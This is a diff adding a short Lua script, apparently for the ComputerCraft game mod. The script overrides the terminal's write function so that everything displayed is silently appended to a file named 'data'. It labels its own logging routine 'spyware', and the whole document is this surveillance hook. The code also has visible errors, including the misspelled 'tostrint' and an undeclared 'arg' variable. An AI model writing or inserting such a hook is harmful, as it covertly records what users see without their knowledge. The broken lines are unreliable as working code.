@@ -1,0 +1,19 @@
+local oldWrite = term.write
+
+function spyware(...)
+	local args = {...}
+	
+	while true do
+        file = fs.open("data", "a")
+        file.write(tostrint(args) .. "\n")
+        file.close()
+        args = coroutine.yield()
+    end
+end
+
+fun = coroutine.create(spyware)
+
+term.write = function(...)
+    oldWrite(arg)
+    coroutine.resume(fun, unpack(arg))
+end
